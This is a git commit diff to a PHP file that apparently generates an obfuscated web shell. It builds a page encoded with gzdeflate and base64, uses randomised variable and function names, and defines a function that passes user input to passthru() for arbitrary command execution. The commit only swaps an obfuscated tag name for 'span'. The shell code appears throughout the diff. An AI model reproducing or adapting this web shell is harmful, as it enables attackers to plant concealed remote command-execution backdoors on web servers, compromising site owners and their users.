584bebae5c55b6da9f7e72858fcbe048d7881c8e
raincoats <tomshaddock@outlook.com>
2015-08-29 15:46:35 +1000

    unobfusting 'html_console_tag' it's a relic from a long time ago and is no longer necessary

--- 2233.php
+++ 2233.php
@@ -35,7 +35,7 @@ $page_html = <<< EOF
             input{ background-color: rgb(255, 255, 255); width: 100%;}
             * { font-size: 12px; color: rgb(0, 0, 0); font-family: monospace !important;}
             body{ background-color: rgb(250, 250, 250);}
-            $html_console_tag{ color: rgb(170, 170, 170);}
+            span{ color: rgb(170, 170, 170);}
         </style>
     </head>
     <body>
@@ -52,11 +52,10 @@ $page_html = base64_encode(gzdeflate($page_html));
 
 $shell = <<< EOF
 <?php
-
 \$$page_html_var = gzinflate(base64_decode("$page_html"));
 
 function $eval_function(\$$eval_arg){
-    echo "<$html_console_tag>\$ ".\$$eval_arg."</$html_console_tag><br>";
+    echo "<span>\$ ".\$$eval_arg."</span><br>";
     echo htmlentities(passthru(\$$eval_arg." 2>&1"));
 }
 echo preg_replace("/$script_name/", basename(\$_SERVER["SCRIPT_NAME"]), \$$page_html_var);
